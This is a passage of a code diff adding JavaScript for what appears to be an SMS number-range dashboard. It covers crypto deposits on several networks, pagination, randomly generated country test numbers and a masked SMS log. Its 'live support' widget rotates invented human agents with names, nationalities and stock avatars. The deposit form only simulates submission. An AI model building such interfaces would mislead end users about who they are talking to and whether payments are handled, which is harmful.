+             const tonDetails = document.getElementById('ton-details');     
+             const polygonDetails = document.getElementById('polygon-details'); 
+             const solanaDetails = document.getElementById('solana-details');  
+             
+             const depositButton = document.getElementById('deposit-button');
+             const amountInput = document.getElementById('deposit-amount');
+             const txInput = document.getElementById('transaction-id');
+             const messageEl = document.getElementById('deposit-message');
+
+             if(!networkSelect) return;
+             
+             updateDepositHistory();
+             
+             networkSelect.addEventListener('change', () => {
+                const selectedNetwork = networkSelect.value;
+                // Hide all network details first
+                trc20Details.style.display = 'none';
+                bep20Details.style.display = 'none';
+                erc20Details.style.display = 'none'; 
+                tonDetails.style.display = 'none';     
+                polygonDetails.style.display = 'none'; 
+                solanaDetails.style.display = 'none';  
+
+                // Show the selected network details
+                if (selectedNetwork === 'trc20') {
+                    trc20Details.style.display = 'block';
+                } else if (selectedNetwork === 'bep20') {
+                    bep20Details.style.display = 'block';
+                } else if (selectedNetwork === 'erc20') { 
+                    erc20Details.style.display = 'block';
+                } else if (selectedNetwork === 'ton') {     
+                    tonDetails.style.display = 'block';
+                } else if (selectedNetwork === 'polygon') { 
+                    polygonDetails.style.display = 'block';
+                } else if (selectedNetwork === 'solana') {  
+                    solanaDetails.style.display = 'block';
+                }
+             });
+
+             // Initialize to show TRC20 details by default on deposit page load
+             networkSelect.value = 'trc20'; // Ensure default selection
+             trc20Details.style.display = 'block';
+
+             document.querySelectorAll('.copy-btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    const targetId = btn.dataset.copyTarget;
+                    let textToCopy = document.getElementById(targetId).innerText;
+
+                    // Special handling for TON where we copy address + memo together
+                    if (targetId === 'ton-address' && networkSelect.value === 'ton') {
+                         const tonMemo = document.getElementById('ton-memo').innerText;
+                         textToCopy = `${textToCopy} (Memo: ${tonMemo})`;
+                    } else if (targetId === 'ton-memo' && networkSelect.value === 'ton') {
+                        // If only memo is explicitly clicked, copy just the memo
+                        textToCopy = document.getElementById('ton-memo').innerText;
+                    }
+                    
+                    navigator.clipboard.writeText(textToCopy).then(() => {
+                        const originalIcon = btn.innerHTML;
+                        btn.innerHTML = '<i class="fas fa-check"></i>';
+                        setTimeout(() => { btn.innerHTML = originalIcon; }, 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy text: ', err);
+                        alert('Failed to copy text. Please try manually.');
+                    });
+                });
+             });
+
+             depositButton.addEventListener('click', () => {
+                const amount = parseFloat(amountInput.value);
+                const txId = txInput.value.trim();
+                
+                messageEl.textContent = '';
+                messageEl.style.color = 'var(--danger)';
+
+                if (isNaN(amount) || amount < 50) { 
+                    messageEl.textContent = 'Please enter a valid amount (minimum 50).'; 
+                    return;
+                }
+                if (!txId) {
+                    messageEl.textContent = 'Please enter the Transaction ID/Hash.';
+                    return;
+                }
+
+                messageEl.style.color = 'var(--dark)';
+                messageEl.textContent = 'Processing your request...';
+                depositButton.disabled = true;
+                depositButton.classList.add('processing');
+                depositButton.textContent = 'PROCESSING...';
+                
+                setTimeout(() => {
+                    depositButton.disabled = false;
+                    depositButton.classList.remove('processing');
+                    depositButton.textContent = 'DEPOSIT';
+                    
+                    messageEl.style.color = 'var(--success)';
+                    messageEl.textContent = 'Deposit submitted for review!';
+
+                    const newDeposit = {
+                        date: new Date().toLocaleString(),
+                        amount: amount.toFixed(2),
+                        network: networkSelect.value.toUpperCase(),
+                        tx: txId.substring(0,4) + '...' + (txId.length > 8 ? txId.substring(txId.length - 4) : txId), // Ensure it handles short TX IDs gracefully
+                        status: "Pending",
+                        statusClass: "status-pending"
+                    };
+                    sampleDepositHistory.unshift(newDeposit);
+                    updateDepositHistory();
+                    updateSidebarBalance(); // Update sidebar after a new deposit
+
+                    amountInput.value = '';
+                    txInput.value = '';
+                    setTimeout(() => { messageEl.textContent = ''; }, 4000);
+
+                }, 2500);
+             });
+        }
+
+        // --- PAGINATION LOGIC (REUSABLE) ---
+        function setupPagination(config) {
+            let currentPage = 1;
+            const renderTable = () => {
+                const recordsPerPageSelect = document.getElementById(config.recordsPerPageId);
+                if (!recordsPerPageSelect) {
+                    console.error(`Records per page select element with ID ${config.recordsPerPageId} not found.`);
+                    return;
+                }
+                const recordsPerPage = parseInt(recordsPerPageSelect.value);
+                
+                const tbody = document.getElementById(config.tbodyId);
+                if (!tbody) {
+                    console.error(`Table body element with ID ${config.tbodyId} not found.`);
+                    return;
+                }
+                tbody.innerHTML = '';
+                const start = (currentPage - 1) * recordsPerPage;
+                const end = start + recordsPerPage;
+                const paginatedItems = config.data.slice(start, end);
+                if (paginatedItems.length === 0) {
+                    // Determine colspan dynamically based on the number of headers
+                    const tableHeaderRow = tbody.previousElementSibling.querySelector('thead tr');
+                    const colspan = tableHeaderRow ? tableHeaderRow.querySelectorAll('th').length : 1;
+                    tbody.innerHTML = `<tr><td colspan="${colspan}" style="text-align: center;">No data available in table</td></tr>`;
+                } else {
+                    paginatedItems.forEach(item => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = config.rowRenderer(item);
+                        tbody.appendChild(row);
+                    });
+                }
+                renderPaginationControls(recordsPerPage);
+            };
+            const renderPaginationControls = (recordsPerPage) => {
+                const totalItems = config.data.length;
+                const totalPages = Math.ceil(totalItems / recordsPerPage);
+                const paginationControls = document.getElementById(config.paginationControlsId);
+                const paginationInfo = document.getElementById(config.paginationInfoId);
+
+                if (!paginationControls || !paginationInfo) {
+                    console.error("Pagination controls or info element not found for config:", config);
+                    return;
+                }
+
+                paginationControls.innerHTML = '';
+                if(totalItems === 0) { 
+                     paginationInfo.innerText = 'Showing 0 to 0 of 0 entries';
+                     return;
+                }
+                const createButton = (text, page) => {
+                    const button = document.createElement('button');
+                    button.innerText = text;
+                    button.addEventListener('click', () => {
+                        currentPage = page;
+                        renderTable();
+                    });
+                    return button;
+                };
+                paginationControls.appendChild(createButton('Previous', currentPage - 1)).disabled = currentPage === 1;
+                
+                let startPage = Math.max(1, currentPage - 2);
+                let endPage = Math.min(totalPages, currentPage + 2);
+
+                if (startPage > 1) {
+                     paginationControls.appendChild(createButton('1', 1));
+                     if(startPage > 2) paginationControls.insertAdjacentHTML('beforeend', `<button disabled>...</button>`);
+                }
+
+                for (let i = startPage; i <= endPage; i++) {
+                    const btn = createButton(i, i);
+                    if (i === currentPage) btn.classList.add('active');
+                    paginationControls.appendChild(btn);
+                }
+
+                if (endPage < totalPages) {
+                     if(endPage < totalPages - 1) paginationControls.insertAdjacentHTML('beforeend', `<button disabled>...</button>`);
+                     paginationControls.appendChild(createButton(totalPages, totalPages));
+                }
+                
+                paginationControls.appendChild(createButton('Next', currentPage + 1)).disabled = currentPage === totalPages;
+                const startEntry = (currentPage - 1) * recordsPerPage + 1;
+                const endEntry = Math.min(startEntry + recordsPerPage - 1, totalItems);
+                paginationInfo.innerText = `Showing ${startEntry} to ${endEntry} of ${totalItems} entries`;
+            };
+
+            const recordsPerPageSelect = document.getElementById(config.recordsPerPageId);
+            if (recordsPerPageSelect) {
+                recordsPerPageSelect.addEventListener('change', () => {
+                    currentPage = 1;
+                    renderTable();
+                });
+            }
+            renderTable();
+        }
+
+        // --- SMS RANGE DATA AND LOGIC (Kept as before per request) ---
+        const asianCountries = [
+            { name: "Afghanistan", prefix: "+93" }, { name: "Bangladesh", prefix: "+880" },
+            { name: "Indonesia", prefix: "+62" }, { name: "Malaysia", prefix: "+60" },
+            { name: "Pakistan", prefix: "+92" }, { name: "Philippines", prefix: "+63" },
+            { name: "Thailand", prefix: "+66" }, { name: "Vietnam", prefix: "+84" }
+        ];
+
+        const userRequestedRanges = [
+            { range: "IndiaFT", prefix: "+91" }, { range: "IndiaHT1", prefix: "+91" },
+            { range: "IndiaG1", prefix: "+91" }, { range: "VenezuelaF2", prefix: "+58" },
+            { range: "VenezuelaHI6", prefix: "+58" }, { range: "VenezuelaAT8", prefix: "+58" },
+            { range: "SaudiArabS8", prefix: "+966" }, { range: "SaudiArab78", prefix: "+966" }
+        ].map(r => ({ ...r, testNumber: `${r.prefix.replace('+','')}${generateRandomNumber(8)}`, currency: 'USD' }));
+
+        const generateMoreRanges = (count) => {
+            const data = [];
+            const suffixes = ['bmet', 'bne', 'blf', 'bld', 'bek', 'bck', 'bbx', 'BAL'];
+            for (let i = 0; i < count; i++) {
+                const country = asianCountries[i % asianCountries.length];
+                data.push({
+                    range: `${country.name} ${suffixes[i % suffixes.length]}`,
+                    prefix: country.prefix,
+                    testNumber: `${country.prefix.replace('+','')}${generateRandomNumber(9)}`,
+                    currency: i % 2 === 0 ? 'USD' : 'EUR'
+                });
+            }
+            return data;
+        };
+        const allSmsRangeData = [...userRequestedRanges, ...generateMoreRanges(500)];
+        
+        const smsRangeConfig = {
+            data: allSmsRangeData,
+            tbodyId: 'sms-range-tbody',
+            paginationControlsId: 'sms-range-pagination-controls',
+            paginationInfoId: 'sms-range-pagination-info',
+            recordsPerPageId: 'sms-range-records-per-page',
+            rowRenderer: item => `
+                <td>${item.range}</td>
+                <td>${item.prefix}</td>
+                <td>${item.testNumber}</td>
+                <td>${item.currency}</td>`
+        };
+
+        // --- MY SMS NUMBERS DATA AND LOGIC ---
+        // This is the raw data used for search filtering.
+        const mySmsNumbersRawData = Array.from({ length: 50 }, (_, i) => {
+            const country = asianCountries[i % asianCountries.length];
+            return {
+                bande: `Bande ${i + 1}`,
+                prefix: country.prefix,
+                number: `${country.prefix.replace('+', '')}${generateRandomNumber(8)}`,
+                myPattern: `Pattern-${i + 1}`,
+                myKnowt: `Note ${i + 1}`,
+                limits: `Limit ${i % 5}`
+            };
+        });
+
+        const mySmsNumbersConfig = {
+            data: [], // Starts empty as per request
+            tbodyId: 'sms-number-tbody',
+            paginationControlsId: 'sms-number-pagination-controls',
+            paginationInfoId: 'sms-number-pagination-info',
+            recordsPerPageId: 'sms-number-records-per-page',
+            rowRenderer: item => `
+                <td>${item.bande}</td>
+                <td>${item.prefix}</td>
+                <td>${item.number}</td>
+                <td>${item.myPattern}</td>
+                <td>${item.myKnowt}</td>
+                <td>${item.limits}</td>`
+        };
+
+        // --- SMS TEST PANEL DATA AND CONFIGS (UPDATED for 24-hour refresh) ---
+        // User-defined specific countries with their suffixes for SMS Test Panel
+        const userDefinedTestCountries = [
+            { name: "Maldives", prefix: "+960", suffix: "H07" },
+            { name: "Sweden", prefix: "+46", suffix: "R3" },
+            { name: "Germany", prefix: "+49", suffix: "F05" },
+            { name: "Saudi Arabia", prefix: "+966", suffix: "A21" },
+            { name: "Mexico", prefix: "+52", suffix: "N1" },
+            { name: "Netherlands", prefix: "+31", suffix: "HQ3" },
+            { name: "Kazakhstan", prefix: "+7", suffix: "Us1" },
+            { name: "Iran", prefix: "+98", suffix: "38" },
+            { name: "Austria", prefix: "+43", suffix: "S09" },
+            { name: "Egypt", prefix: "+20", suffix: "far1" },
+            { name: "Yemen", prefix: "+967", suffix: "bbx2" }, // Adjusted for consistency
+            { name: "Belarus", prefix: "+375", suffix: "3F" },
+            { name: "Ethiopia", prefix: "+251", suffix: "053" },
+            { name: "Bulgaria", prefix: "+359", suffix: "tu2" },
+            { name: "Senegal", prefix: "+221", suffix: "Slg" },
+            { name: "Morocco", prefix: "+212", suffix: "bmet" },
+            { name: "United Arab Emirates", prefix: "+971", suffix: "Au" },
+            { name: "Venezuela", prefix: "+58", suffix: "Gk" },
+            { name: "Netherlands", prefix: "+31", suffix: "bna5" }, 
+            { name: "Brazil", prefix: "+55", suffix: "km07" },
+            { name: "Saudi Arabia", prefix: "+966", suffix: "Bmn1" }, 
+            { name: "Poland", prefix: "+48", suffix: "DA1" },
+            // Additional Asian countries with generic suffixes to fulfill "all Asian countries"
+            { name: "Afghanistan", prefix: "+93", suffix: "RNG1" },
+            { name: "Armenia", prefix: "+374", suffix: "RNG2" },
+            { name: "Azerbaijan", prefix: "+994", suffix: "RNG3" },
+            { name: "Bahrain", prefix: "+973", suffix: "RNG4" },
+            { name: "Bangladesh", prefix: "+880", suffix: "RNG5" },
+            { name: "Bhutan", prefix: "+975", suffix: "RNG6" },
+            { name: "Brunei", prefix: "+673", suffix: "RNG7" },
+            { name: "Cambodia", prefix: "+855", suffix: "RNG8" },
+            { name: "China", prefix: "+86", suffix: "RNG9" },
+            { name: "Cyprus", prefix: "+357", suffix: "RNG10" }, 
+            { name: "East Timor", prefix: "+670", suffix: "RNG11" },
+            { name: "Georgia", prefix: "+995", suffix: "RNG12" }, 
+            { name: "Hong Kong", prefix: "+852", suffix: "RNG13" },
+            { name: "India", prefix: "+91", suffix: "RNG14" },
+            { name: "Indonesia", prefix: "+62", suffix: "RNG15" },
+            { name: "Iraq", prefix: "+964", suffix: "RNG16" },
+            { name: "Israel", prefix: "+972", suffix: "RNG17" },
+            { name: "Japan", prefix: "+81", suffix: "RNG18" },
+            { name: "Jordan", prefix: "+962", suffix: "RNG19" },
+            { name: "Kuwait", prefix: "+965", suffix: "RNG20" },
+            { name: "Kyrgyzstan", prefix: "+996", suffix: "RNG21" },
+            { name: "Laos", prefix: "+856", suffix: "RNG22" },
+            { name: "Lebanon", prefix: "+961", suffix: "RNG23" },
+            { name: "Macau", prefix: "+853", suffix: "RNG24" },
+            { name: "Malaysia", prefix: "+60", suffix: "RNG25" },
+            { name: "Maldives", prefix: "+960", suffix: "RNG26" },
+            { name: "Mongolia", prefix: "+976", suffix: "RNG27" },
+            { name: "Myanmar", prefix: "+95", suffix: "RNG28" },
+            { name: "Nepal", prefix: "+977", suffix: "RNG29" },
+            { name: "North Korea", prefix: "+850", suffix: "RNG30" },
+            { name: "Oman", prefix: "+968", suffix: "RNG31" },
+            { name: "Pakistan", prefix: "+92", suffix: "RNG32" },
+            { name: "Palestine", prefix: "+970", suffix: "RNG33" },
+            { name: "Philippines", prefix: "+63", suffix: "RNG34" },
+            { name: "Qatar", prefix: "+974", suffix: "RNG35" },
+            { name: "Singapore", prefix: "+65", suffix: "RNG36" },
+            { name: "South Korea", prefix: "+82", suffix: "RNG37" },
+            { name: "Sri Lanka", prefix: "+94", suffix: "RNG38" },
+            { name: "Syria", prefix: "+963", suffix: "RNG39" },
+            { name: "Taiwan", prefix: "+886", suffix: "RNG40" },
+            { name: "Tajikistan", prefix: "+992", suffix: "RNG41" },
+            { name: "Thailand", prefix: "+66", suffix: "RNG42" },
+            { name: "Turkey", prefix: "+90", suffix: "RNG43" }, 
+            { name: "Turkmenistan", prefix: "+993", suffix: "RNG44" },
+            { name: "Uzbekistan", prefix: "+998", suffix: "RNG45" },
+            { name: "Vietnam", prefix: "+84", suffix: "RNG46" }
+        ];
+
+
+        function generateSmsTestNumbersData() {
+            const data = [];
+            const numberOfEntries = 2500; 
+            for (let i = 0; i < numberOfEntries; i++) {
+                const countryEntry = userDefinedTestCountries[Math.floor(Math.random() * userDefinedTestCountries.length)];
+                
+                data.push({
+                    range: `${countryEntry.name} ${countryEntry.suffix}`, 
+                    prefix: countryEntry.prefix,
+                    number: `${countryEntry.prefix.replace('+', '')}${generateRandomNumber(9)}` 
+                });
+            }
+            return data;
+        }
+
+        let smsTestNumbersData = [];
+
+        function loadOrGenerateSmsTestNumbersData() {
+            const lastUpdate = sessionStorage.getItem('lastTestNumbersUpdate'); 
+            const cachedData = sessionStorage.getItem('cachedSmsTestNumbersData'); 
+            const twentyFourHours = 24 * 60 * 60 * 1000;
+
+            if (lastUpdate && cachedData && (Date.now() - parseInt(lastUpdate) < twentyFourHours)) {
+                smsTestNumbersData = JSON.parse(cachedData);
+                console.log("Using cached SMS Test Numbers data.");
+            } else {
+                smsTestNumbersData = generateSmsTestNumbersData();
+                sessionStorage.setItem('lastTestNumbersUpdate', Date.now().toString()); 
+                sessionStorage.setItem('cachedSmsTestNumbersData', JSON.stringify(smsTestNumbersData)); 
+                console.log("Generated new SMS Test Numbers data.");
+            }
+            smsTestNumbersConfig.data = smsTestNumbersData;
+        }
+
+        // Get unique app names from smsData to use for CLI generation, removing heavy bias
+        const uniqueApps = [...new Set(smsData.map(item => item.app))];
+
+        const recentSmsTestData = Array.from({ length: 3000 }, (_, i) => {
+            const countryEntry = userDefinedTestCountries[i % userDefinedTestCountries.length]; 
+            const randomApp = uniqueApps[Math.floor(Math.random() * uniqueApps.length)]; // Pick from all unique apps
+            let date = new Date();
+            date.setMinutes(date.getMinutes() - (i * 5));
+            
+            return {
+                date: date.toISOString().replace('T', '<br>').substring(0, 19),
+                range: `${countryEntry.name} ${countryEntry.suffix} Test`, 
+                number: `${countryEntry.prefix.replace('+', '')}${generateRandomNumber(9)}`,
+                cli: maskService(randomApp), 
+                sms: "****" 
+            };
+        });
+
+        const smsTestNumbersConfig = {
+            data: smsTestNumbersData,
+            tbodyId: 'sms-test-numbers-tbody',
+            paginationControlsId: 'sms-test-numbers-pagination-controls',
+            paginationInfoId: 'sms-test-numbers-pagination-info',
+            recordsPerPageId: 'sms-test-numbers-records-per-page',
+            rowRenderer: item => `
+                <td>${item.range}</td>
+                <td>${item.prefix}</td>
+                <td>${item.number}</td>
+                <td>Ask</td>
+                <td>SD: 0 | SW: 0</td>`
+        };
+
+        const recentSmsTestConfig = {
+            data: recentSmsTestData,
+            tbodyId: 'recent-sms-test-tbody',
+            paginationControlsId: 'recent-sms-test-pagination-controls',
+            paginationInfoId: 'recent-sms-test-pagination-info',
+            recordsPerPageId: 'recent-sms-test-records-per-page',
+            rowRenderer: item => `
+                <td>${item.date}</td>
+                <td>${item.range}</td>
+                <td>${item.number}</td>
+                <td>${item.cli}</td>
+                <td>${item.sms}</td>` 
+        };
+
+        // --- LIVE SUPPORT AGENT DATA AND LOGIC ---
+        const supportAgents = [
+            { name: "Sofia", gender: "female", country: "Italy", avatar: "https://i.ibb.co/hLd7VdD/girl-avatar.png" }, // Generic female avatar
+            { name: "Marco", gender: "male", country: "Italy", avatar: "https://i.ibb.co/M9B8z83/male-avatar1.png" }, // Generic male avatar
+            { name: "Chloé", gender: "female", country: "France", avatar: "https://i.ibb.co/hLd7VdD/girl-avatar.png" },
+            { name: "Antoine", gender: "male", country: "France", avatar: "https://i.ibb.co/M9B8z83/male-avatar1.png" },
+            { name: "Lena", gender: "female", country: "Germany", avatar: "https://i.ibb.co/hLd7VdD/girl-avatar.png" },
+            { name: "Maximilian", gender: "male", country: "Germany", avatar: "https://i.ibb.co/M9B8z83/male-avatar1.png" },
+            { name: "Irina", gender: "female", country: "Russia", avatar: "https://i.ibb.co/hLd7VdD/girl-avatar.png" },
+            { name: "Dmitry", gender: "male", country: "Russia", avatar: "https://i.ibb.co/M9B8z83/male-avatar1.png" },
+            { name: "Eleni", gender: "female", country: "Greece", avatar: "https://i.ibb.co/hLd7VdD/girl-avatar.png" },
+            { name: "Nikos", gender: "male", country: "Greece", avatar: "https://i.ibb.co/M9B8z83/male-avatar1.png" },
+        ];
+        let currentSupportAgentIndex = 0;
+        let currentSupportAgent = supportAgents[currentSupportAgentIndex];
+
+        function rotateSupportAgent() {
+            currentSupportAgentIndex = (currentSupportAgentIndex + 1) % supportAgents.length;
+            currentSupportAgent = supportAgents[currentSupportAgentIndex];
+            
+            const agentAvatar = document.getElementById('agent-avatar');
+            const agentName = document.getElementById('current-agent-name');
+            if (agentAvatar && agentName) {
+                agentAvatar.src = currentSupportAgent.avatar;
+                agentName.textContent = currentSupportAgent.name;
+                // Add a welcome message from the new agent
+                const liveChatMessages = document.getElementById('live-chat-messages');
+                if (liveChatMessages) {
+                    const lastMessage = liveChatMessages.lastElementChild;
+                    // Only add a rotation message if there has been some conversation and it's not the initial load
+                    if (lastMessage && !lastMessage.textContent.includes("How can I help you today?")) {
+                        addChatMessage(`Hello, I'm ${currentSupportAgent.name}. I'll be assisting you now. How can I help?`, 'support', currentSupportAgent.name, currentSupportAgent.avatar);
+                    }
+                }
+            }
+            lastChatActivityTime = Date.now(); // Reset activity time after rotation
+        }
+
+        function initializeLiveSupportAgent() {
+            // Pick a random agent to start
+            currentSupportAgentIndex = Math.floor(Math.random() * supportAgents.length);
+            currentSupportAgent = supportAgents[currentSupportAgentIndex];
+
+            const agentAvatar = document.getElementById('agent-avatar');
+            const agentName = document.getElementById('current-agent-name');
+            if (agentAvatar && agentName) {
+                agentAvatar.src = currentSupportAgent.avatar;
+                agentName.textContent = currentSupportAgent.name;
+            }
+            lastChatActivityTime = Date.now(); // Initialize activity time
+        }
+
+        function startInactivityTimer() {
+            clearInterval(inactivityTimer); // Clear any existing timer
+            inactivityTimer = setInterval(() => {
+                if (Date.now() - lastChatActivityTime > INACTIVITY_THRESHOLD) {
+                    rotateSupportAgent();
+                }
+            }, AGENT_ROTATION_INTERVAL); // Check inactivity every AGENT_ROTATION_INTERVAL
+        }
+
+        // --- INITIALIZE ON PAGE LOAD ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // Use sessionStorage for login persistence across reloads within the same session
+            const isLoggedIn = sessionStorage.getItem('isLoggedIn');
+            const loggedInUsername = sessionStorage.getItem('loggedInUsername');
+            const loggedInAgentId = sessionStorage.getItem('loggedInAgentId');
+
+            // Hide dashboard-related elements by default.
+            mainContentWrapper.style.display = 'none';
+            menuToggle.style.display = 'none';
+            liveSupportFloatingButton.style.display = 'none'; // Renamed
+            
+            // generateCaptcha() is now called directly in the script, not waiting for DOMContentLoaded.
+            // This ensures it populates the captcha as soon as the element is available.
+
+            if (isLoggedIn === 'true' && loggedInUsername && loggedInAgentId) {
+                // If logged in (via sessionStorage), hide login container and show dashboard directly
+                document.getElementById('login-container').style.display = 'none'; 
+                document.getElementById('sidebar-username').textContent = loggedInUsername;
+                document.getElementById('sidebar-userid').innerHTML = `<i class="fas fa-id-badge"></i> Agent ID: ${loggedInAgentId}`;
+                updateSidebarBalance(); // Update sidebar balance on reload
+                
+                mainContentWrapper.style.display = 'block'; 
+                menuToggle.style.display = 'flex'; 
+                liveSupportFloatingButton.style.display = 'flex'; // Renamed
+                showSection('dashboard'); // Load dashboard content
+                // Do NOT play voice here, as this is a reload, not an initial login.
+            } else {
+                // If not logged in, ensure login container is visible.
+                document.getElementById('login-container').style.display = 'flex'; 
+            }
+        });
+        
+    </script>
+</body>
+</html>
+```
